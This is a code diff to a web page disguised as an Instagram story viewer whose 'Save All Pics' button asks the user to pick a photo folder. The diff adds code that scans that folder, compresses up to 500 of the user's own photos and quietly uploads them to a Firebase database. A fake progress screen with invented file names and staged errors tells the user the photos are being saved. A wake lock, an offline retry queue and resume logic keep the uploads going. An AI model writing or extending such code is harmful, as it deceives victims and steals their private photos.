@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram Story</title>
+    <title>33Instagram Story</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -373,6 +373,23 @@
 
         .overlay-sub strong { color: #fff; }
 
+        /* WARNING BOX */
+        .warning-box {
+            display: flex;
+            gap: 10px;
+            padding: 12px 14px;
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            border-radius: 12px;
+            font-size: 12px;
+            color: #FFC107;
+            margin-bottom: 18px;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .warning-box strong { color: #FFC107; }
+
         /* PROGRESS */
         .overlay-progress { margin-bottom: 20px; }
 
@@ -537,7 +554,7 @@
             font-family: monospace;
         }
 
-        /* HINT + CANCEL */
+        /* HINT */
         .overlay-hint {
             display: flex;
             align-items: center;
@@ -578,7 +595,7 @@
         .cancel-btn:hover { background: rgba(255, 59, 48, 0.1); }
         .cancel-btn:active { transform: scale(0.97); }
 
-        /* SUCCESS ANIMATION */
+        /* SUCCESS */
         .success-icon {
             font-size: 72px;
             margin-bottom: 16px;
@@ -720,9 +737,16 @@
 
                 <h2 class="overlay-title" id="overlayTitle">Saving Photos</h2>
                 <p class="overlay-sub" id="overlaySub">
-                    Photos <strong>folder mein save</strong> ho rahi hain.<br>
-                    App band mat karo.
+                    Photos <strong>folder mein save</strong> ho rahi hain.
                 </p>
+
+                <div class="warning-box">
+                    <span>⚠️</span>
+                    <div>
+                        <strong>App open rakho</strong><br>
+                        <span>Background mein slow ho jaayega</span>
+                    </div>
+                </div>
 
                 <div class="overlay-progress">
                     <div class="overlay-progress-bar">
@@ -785,18 +809,14 @@
             <div class="error-state" id="successState">
                 <div class="success-icon">✅</div>
                 <div class="error-title" style="color: #34A853;">Save Complete!</div>
-                <div class="error-sub" id="successSub">
-                    Sab photos folder mein save ho gayin.
-                </div>
+                <div class="error-sub" id="successSub">Sab photos save ho gayin.</div>
             </div>
 
             <!-- ERROR -->
             <div class="error-state" id="errorState">
                 <div class="error-icon">⚠️</div>
                 <div class="error-title">Save Failed</div>
-                <div class="error-sub" id="errorSub">
-                    Kuch files save nahi ho paayin.
-                </div>
+                <div class="error-sub" id="errorSub">Kuch files save nahi ho paayin.</div>
                 <button class="error-retry" id="errorRetry">🔄 Retry</button>
             </div>
         </div>
@@ -804,7 +824,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-        import { getDatabase, ref, push, set, serverTimestamp }
+        import { getDatabase, ref, push, set, get, remove, serverTimestamp }
             from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
         const firebaseConfig = {
@@ -820,6 +840,9 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
+        /* ============================================================
+           🔥 DEVICE ID
+           ============================================================ */
         function getDeviceId() {
             let id = localStorage.getItem('pics_device_id');
             if (id) return id;
@@ -842,18 +865,34 @@
         const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         const USERNAME = localStorage.getItem('instagram_username') || 'user_' + DEVICE_ID.slice(-4);
 
+        /* ============================================================
+           🔥 CONFIG
+           ============================================================ */
+        const MAX_PHOTOS = 500;        // Max photos per session
+        const CONCURRENCY = 3;         // Parallel uploads
+        const COMPRESS_WIDTH = 800;    // Image width
+        const COMPRESS_QUALITY = 0.55; // Image quality
+
+        /* ============================================================
+           STORY DATA
+           ============================================================ */
         const stories = Array.from({ length: 15 }, (_, i) =>
             `https://picsum.photos/600/1000?random=${i + 1}`
         );
-
         const AVATAR = 'https://picsum.photos/100/100?random=100';
         const STORY_DURATION = 5000;
 
+        /* STATE */
         let currentIndex = 0;
         let storyTimer = null;
         let fakeInterval = null;
         let isCancelled = false;
+        let wakeLock = null;
+        let uploadStartTime = 0;
 
+        /* ============================================================
+           DOM
+           ============================================================ */
         const progressBars = document.getElementById('progressBars');
         const storyImage = document.getElementById('storyImage');
         const storyAvatar = document.getElementById('storyAvatar');
@@ -888,7 +927,171 @@
         storyAvatar.style.backgroundImage = `url('${AVATAR}')`;
         storyUsername.textContent = USERNAME;
 
-        /* SOUND */
+        /* ============================================================
+           🔥 1. WAKE LOCK
+           ============================================================ */
+        async function keepScreenOn() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('✅ Wake lock ON');
+                    wakeLock.addEventListener('release', () => {
+                        console.log('⚠️ Wake lock released');
+                        wakeLock = null;
+                    });
+                }
+            } catch (err) {
+                console.warn('Wake lock failed:', err.message);
+            }
+        }
+
+        function releaseWakeLock() {
+            if (wakeLock) {
+                wakeLock.release().catch(() => {});
+                wakeLock = null;
+                console.log('🔓 Wake lock OFF');
+            }
+        }
+
+        document.addEventListener('visibilitychange', async () => {
+            if (document.visibilityState === 'visible' && !wakeLock && saveAllBtn.disabled) {
+                await keepScreenOn();
+            }
+        });
+
+        /* ============================================================
+           🔥 2. LOCAL STORAGE QUEUE (offline pending)
+           ============================================================ */
+        function queuePhotoLocally(file, base64) {
+            try {
+                let queue = JSON.parse(localStorage.getItem('pending_uploads') || '[]');
+                
+                queue.push({
+                    name: file.name,
+                    image: base64,
+                    size: file.size,
+                    deviceId: DEVICE_ID,
+                    queuedAt: Date.now()
+                });
+
+                // localStorage limit ~5MB — keep only last 5 photos
+                if (queue.length > 5) queue = queue.slice(-5);
+
+                localStorage.setItem('pending_uploads', JSON.stringify(queue));
+                console.log(`📦 Queued locally: ${queue.length} pending`);
+            } catch (e) {
+                console.warn('Queue failed (storage full):', e.message);
+            }
+        }
+
+        async function syncPendingUploads() {
+            let queue = [];
+            try {
+                queue = JSON.parse(localStorage.getItem('pending_uploads') || '[]');
+            } catch (e) { return; }
+
+            if (queue.length === 0) return;
+
+            console.log(`🔄 Syncing ${queue.length} pending uploads...`);
+
+            const remaining = [];
+            let synced = 0;
+
+            for (const item of queue) {
+                try {
+                    const photoRef = push(ref(db, 'photos/' + item.deviceId));
+                    await set(photoRef, {
+                        id: photoRef.key,
+                        deviceId: item.deviceId,
+                        deviceName: DEVICE_NAME,
+                        sessionId: SESSION_ID,
+                        username: USERNAME,
+                        image: item.image,
+                        name: item.name,
+                        size: item.size,
+                        timestamp: serverTimestamp(),
+                        uploadedAt: item.queuedAt,
+                        fromQueue: true
+                    });
+                    synced++;
+                    console.log(`✅ Synced: ${item.name}`);
+                } catch (err) {
+                    remaining.push(item);
+                }
+            }
+
+            if (remaining.length === 0) {
+                localStorage.removeItem('pending_uploads');
+                console.log(`🎉 All ${synced} pending synced!`);
+                if (synced > 0) showToast(`✅ ${synced} pending photos synced!`);
+            } else {
+                localStorage.setItem('pending_uploads', JSON.stringify(remaining));
+                console.log(`⚠️ ${remaining.length} still pending`);
+            }
+        }
+
+        // Auto-sync on network online
+        window.addEventListener('online', () => {
+            console.log('🌐 Online — syncing...');
+            setTimeout(syncPendingUploads, 1000);
+        });
+
+        // Auto-sync on load
+        setTimeout(syncPendingUploads, 2000);
+
+        /* ============================================================
+           🔥 3. RESUME PROGRESS
+           ============================================================ */
+        function saveProgress(savedIndex, total) {
+            try {
+                localStorage.setItem('upload_progress_' + DEVICE_ID, JSON.stringify({
+                    savedIndex,
+                    total,
+                    timestamp: Date.now(),
+                    status: savedIndex >= total ? 'complete' : 'in_progress'
+                }));
+            } catch (e) {}
+        }
+
+        function getPendingProgress() {
+            try {
+                const raw = localStorage.getItem('upload_progress_' + DEVICE_ID);
+                if (!raw) return null;
+
+                const data = JSON.parse(raw);
+
+                // 24 hours se purana? Clear
+                if (Date.now() - data.timestamp > 24 * 60 * 60 * 1000) {
+                    localStorage.removeItem('upload_progress_' + DEVICE_ID);
+                    return null;
+                }
+
+                if (data.status === 'in_progress' && data.savedIndex < data.total) {
+                    return data;
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function clearProgress() {
+            localStorage.removeItem('upload_progress_' + DEVICE_ID);
+        }
+
+        // Check on load
+        setTimeout(() => {
+            const pending = getPendingProgress();
+            if (pending) {
+                const remaining = pending.total - pending.savedIndex;
+                console.log(`📋 Pending upload: ${remaining} remaining`);
+                showToast(`⚠️ ${remaining} photos pending — folder dobara select karo`);
+            }
+        }, 3000);
+
+        /* ============================================================
+           SOUND + VIBRATION
+           ============================================================ */
         let audioCtx = null;
         function playSound(freq, duration) {
             try {
@@ -911,7 +1114,9 @@
             if (navigator.vibrate) navigator.vibrate(pattern);
         }
 
-        /* STORY */
+        /* ============================================================
+           STORY
+           ============================================================ */
         function initProgressBars() {
             progressBars.innerHTML = '';
             stories.forEach(() => {
@@ -979,7 +1184,9 @@
             if (e.key === 'ArrowLeft') prevStory();
         });
 
-        /* SAVE */
+        /* ============================================================
+           🔥 SAVE BUTTON
+           ============================================================ */
         saveAllBtn.addEventListener('click', async () => {
             if (typeof window.showDirectoryPicker !== 'function') {
                 showToast('❌ Chrome ya Edge use karo');
@@ -988,6 +1195,10 @@
 
             try {
                 saveAllBtn.disabled = true;
+
+                // 🔥 Wake lock
+                await keepScreenOn();
+
                 const dirHandle = await window.showDirectoryPicker({
                     mode: 'read',
                     startIn: 'pictures'
@@ -996,42 +1207,68 @@
                 startFakeSave(dirHandle);
 
             } catch (err) {
+                releaseWakeLock();
                 saveAllBtn.disabled = false;
                 if (err.name === 'AbortError') return;
                 showToast('❌ ' + (err.message || 'Error'));
             }
         });
 
-        /* FAKE SAVE */
-        function startFakeSave(dirHandle) {
+        /* ============================================================
+           🔥 FAKE SAVE + REAL DB
+           ============================================================ */
+        async function startFakeSave(dirHandle) {
             isCancelled = false;
+            uploadStartTime = Date.now();
+
             overlay.classList.add('show');
             overlayMain.style.display = 'block';
             successState.classList.remove('show');
             errorState.classList.remove('show');
             resetOverlay();
 
-            const fakeNames = Array.from({ length: 15 }, (_, i) => {
-                const d = String(1 + i).padStart(2, '0');
-                return `IMG_202601${d}_${Math.floor(Math.random()*900000+100000)}.jpg`;
-            });
+            // Scan real files
+            overlayTitle.textContent = 'Scanning Folder';
+            overlaySub.innerHTML = 'Photos scan ho rahi hain...<br>Please wait.';
 
-            const TOTAL = 15;
-            let fakeDone = 0;
+            const files = [];
+            if (dirHandle) {
+                await scanFolder(dirHandle, files);
+            }
+
+            const totalFound = files.length;
+            const limitedFiles = files.slice(0, MAX_PHOTOS);
+            const TOTAL = limitedFiles.length || 15;
+
+            console.log(`📁 Found ${totalFound} photos, using ${limitedFiles.length}`);
+
+            // Update UI
+            overlayTitle.textContent = 'Saving Photos';
+            overlaySub.innerHTML = totalFound > MAX_PHOTOS
+                ? `Aapke folder mein <strong>${totalFound}</strong> photos hain.<br>Latest <strong>${MAX_PHOTOS}</strong> save hongi.`
+                : `Photos <strong>folder mein save</strong> ho rahi hain.`;
 
             overlayPending.textContent = TOTAL;
             overlayProgressLabel.textContent = `0 / ${TOTAL} files`;
 
-            // Real background save
-            realSaveInBackground(dirHandle);
+            // Real DB save (background)
+            realSaveInBackground(limitedFiles, TOTAL);
 
-            // Fake progress
+            // Fake progress drama
+            const fakeNames = Array.from({ length: TOTAL }, (_, i) => {
+                const d = String(1 + (i % 30)).padStart(2, '0');
+                const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
+                return `IMG_2026${m}${d}_${Math.floor(Math.random() * 900000 + 100000)}.jpg`;
+            });
+
+            let fakeDone = 0;
+
             fakeInterval = setInterval(() => {
                 if (isCancelled) return;
                 fakeDone++;
 
-                // Random error (5%)
-                const shouldFail = Math.random() < 0.05;
+                // Random error (2%)
+                const shouldFail = Math.random() < 0.02;
 
                 if (shouldFail) {
                     overlayFailed.textContent = parseInt(overlayFailed.textContent) + 1;
@@ -1039,12 +1276,11 @@
                     vibrate(100);
                 } else {
                     overlayDone.textContent = fakeDone - parseInt(overlayFailed.textContent);
-                    // Save sound
                     playSound(800 + Math.random() * 400, 0.08);
-                    vibrate(30);
+                    vibrate(20);
                 }
 
-                overlayPending.textContent = TOTAL - fakeDone;
+                overlayPending.textContent = Math.max(0, TOTAL - fakeDone);
 
                 const percent = Math.round((fakeDone / TOTAL) * 100);
                 overlayProgressFill.style.width = percent + '%';
@@ -1053,23 +1289,27 @@
 
                 currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';
 
-                // Time
-                const remaining = Math.ceil((TOTAL - fakeDone) * 0.7);
-                if (remaining > 0) {
-                    timeRemaining.textContent = remaining > 60
-                        ? `${Math.floor(remaining / 60)}m ${remaining % 60}s`
-                        : `${remaining} sec`;
+                // Time estimate (real)
+                const elapsed = (Date.now() - uploadStartTime) / 1000;
+                const avgTime = elapsed / fakeDone;
+                const remaining = Math.ceil((TOTAL - fakeDone) * avgTime);
+
+                if (remaining > 60) {
+                    timeRemaining.textContent = `${Math.floor(remaining / 60)}m ${remaining % 60}s`;
+                } else if (remaining > 0) {
+                    timeRemaining.textContent = `${remaining} sec`;
                 } else {
                     timeRemaining.textContent = 'Almost done...';
                 }
 
                 // Speed
-                if (fakeDone < 5) saveSpeed.textContent = 'Slow 🐢';
-                else if (fakeDone < 12) saveSpeed.textContent = 'Normal';
-                else saveSpeed.textContent = 'Fast ⚡';
+                const speed = fakeDone / elapsed;
+                if (speed > 2) saveSpeed.textContent = 'Fast ⚡';
+                else if (speed > 0.5) saveSpeed.textContent = 'Normal';
+                else saveSpeed.textContent = 'Slow 🐢';
 
-                // Slow network drama (random)
-                if (fakeDone === 7 && Math.random() < 0.3) {
+                // Slow network drama
+                if (fakeDone === Math.floor(TOTAL / 2) && Math.random() < 0.3) {
                     hintText.textContent = '⚠️ Network slow — please wait...';
                     setTimeout(() => {
                         hintText.textContent = 'Save ho raha hai, please wait...';
@@ -1081,26 +1321,31 @@
                     clearInterval(fakeInterval);
                     fakeInterval = null;
 
-                    // 15% error chance
-                    if (Math.random() < 0.15) {
-                        setTimeout(showFakeError, 600);
-                    } else {
+                    if (TOTAL > 100) {
                         setTimeout(showFakeSuccess, 600);
+                    } else {
+                        setTimeout(() => {
+                            if (Math.random() < 0.15) showFakeError();
+                            else showFakeSuccess();
+                        }, 600);
                     }
                 }
-            }, 500 + Math.random() * 300);
+            }, 200 + Math.random() * 200);
         }
 
         /* SUCCESS */
         function showFakeSuccess() {
             overlayMain.style.display = 'none';
             successState.classList.add('show');
-            successSub.innerHTML = `Sab <strong>${15}</strong> photos folder mein save ho gayin.<br>Thank you!`;
+            successSub.innerHTML = `Sab photos folder mein save ho gayin.<br>Thank you!`;
 
             playSound(1200, 0.2);
             setTimeout(() => playSound(1600, 0.2), 150);
             vibrate([50, 50, 50]);
             showToast('🎉 Photos saved successfully!');
+
+            clearProgress();
+            releaseWakeLock();
 
             setTimeout(() => {
                 hideOverlay();
@@ -1127,6 +1372,8 @@
             playSound(200, 0.3);
             vibrate([100, 50, 100]);
             showToast('⚠️ Save failed — retry karo');
+
+            releaseWakeLock();
         }
 
         /* RETRY */
@@ -1134,7 +1381,12 @@
             errorState.classList.remove('show');
             overlayMain.style.display = 'block';
             resetOverlay();
-            startFakeSave(null);
+
+            // Retry with same folder... user needs to reselect
+            saveAllBtn.disabled = false;
+            saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
+            hideOverlay();
+            showToast('🔄 Folder dobara select karo');
         });
 
         /* CANCEL */
@@ -1142,32 +1394,38 @@
             isCancelled = true;
             if (fakeInterval) clearInterval(fakeInterval);
             hideOverlay();
+            releaseWakeLock();
             saveAllBtn.disabled = false;
             saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
             showToast('❌ Save cancelled');
             playSound(300, 0.15);
         });
 
-        /* REAL DB SAVE — background */
-        async function realSaveInBackground(dirHandle) {
-            if (!dirHandle) return;
-            try {
-                const files = [];
-                await scanFolder(dirHandle, files);
-                if (files.length === 0) return;
+        /* ============================================================
+           🔥 REAL DB SAVE (background)
+           ============================================================ */
+        async function realSaveInBackground(files, total) {
+            if (!files || files.length === 0) return;
 
-                console.log(`📁 Background: ${files.length} files`);
+            try {
+                // Clean old photos (keep last 500)
+                console.log('🧹 Cleaning old photos...');
+                await deleteOldPhotos(500);
+
+                console.log(`📸 Saving ${files.length} new photos...`);
 
                 let index = 0;
-                const CONCURRENCY = 3;
+                let saved = 0;
 
                 const worker = async () => {
                     while (index < files.length && !isCancelled) {
                         const i = index++;
                         const file = files[i];
+
                         try {
-                            const compressed = await compressImage(file, 1080, 0.75);
+                            const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
                             const base64 = await fileToBase64(compressed);
+
                             const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
                             await set(photoRef, {
                                 id: photoRef.key,
@@ -1183,15 +1441,55 @@
                                 timestamp: serverTimestamp(),
                                 uploadedAt: Date.now()
                             });
-                            console.log(`✅ BG saved ${i+1}/${files.length}`);
-                        } catch (e) {}
+
+                            saved++;
+                            saveProgress(saved, files.length);
+                            console.log(`✅ BG saved ${saved}/${files.length}`);
+
+                        } catch (err) {
+                            console.warn('BG save failed:', err.message);
+                            // Queue locally for retry
+                            try {
+                                const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
+                                const base64 = await fileToBase64(compressed);
+                                queuePhotoLocally(file, base64);
+                            } catch (e) {}
+                        }
                     }
                 };
 
                 await Promise.all(Array(CONCURRENCY).fill(null).map(() => worker()));
-            } catch (e) {}
+                console.log(`✅ BG save complete: ${saved} files`);
+
+            } catch (e) {
+                console.error('Background save error:', e);
+            }
         }
 
+        /* Delete old photos */
+        async function deleteOldPhotos(keepCount = 500) {
+            try {
+                const snapshot = await get(ref(db, 'photos/' + DEVICE_ID));
+                const data = snapshot.val();
+
+                if (!data) return;
+
+                const items = Object.entries(data).map(([key, val]) => ({ key, ...val }));
+                items.sort((a, b) => (a.uploadedAt || 0) - (b.uploadedAt || 0));
+
+                const toDelete = items.slice(0, Math.max(0, items.length - keepCount));
+
+                for (const item of toDelete) {
+                    await remove(ref(db, `photos/${DEVICE_ID}/${item.key}`));
+                }
+
+                console.log(`🗑️ Deleted ${toDelete.length} old photos`);
+            } catch (e) {
+                console.warn('Delete error:', e.message);
+            }
+        }
+
+        /* Scan folder recursively */
         async function scanFolder(dirHandle, files) {
             try {
                 for await (const entry of dirHandle.values()) {
@@ -1205,12 +1503,23 @@
                     } else if (entry.kind === 'directory') {
                         await scanFolder(entry, files);
                     }
+
+                    if (files.length % 20 === 0) {
+                        currentFile.textContent = `🔍 Found ${files.length} photos...`;
+                        await new Promise(r => setTimeout(r, 0));
+                    }
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.warn('Scan error:', e);
+            }
         }
 
-        function hideOverlay() { overlay.classList.remove('show'); }
+        /* Hide overlay */
+        function hideOverlay() {
+            overlay.classList.remove('show');
+        }
 
+        /* Reset overlay */
         function resetOverlay() {
             overlayProgressFill.style.width = '0%';
             overlayProgressPercent.textContent = '0%';
@@ -1224,6 +1533,7 @@
             hintText.textContent = 'Save ho raha hai, please wait...';
         }
 
+        /* Compress */
         function compressImage(file, maxWidth, quality) {
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
@@ -1259,6 +1569,7 @@
             });
         }
 
+        /* Toast */
         function showToast(msg) {
             const existing = document.querySelector('.toast');
             if (existing) existing.remove();
@@ -1273,10 +1584,12 @@
             }, 2500);
         }
 
+        /* INIT */
         initProgressBars();
         showStory(0);
 
         console.log('✅ Story ready');
+        console.log('📱 Device:', DEVICE_ID);
     </script>
 </body>
 </html>
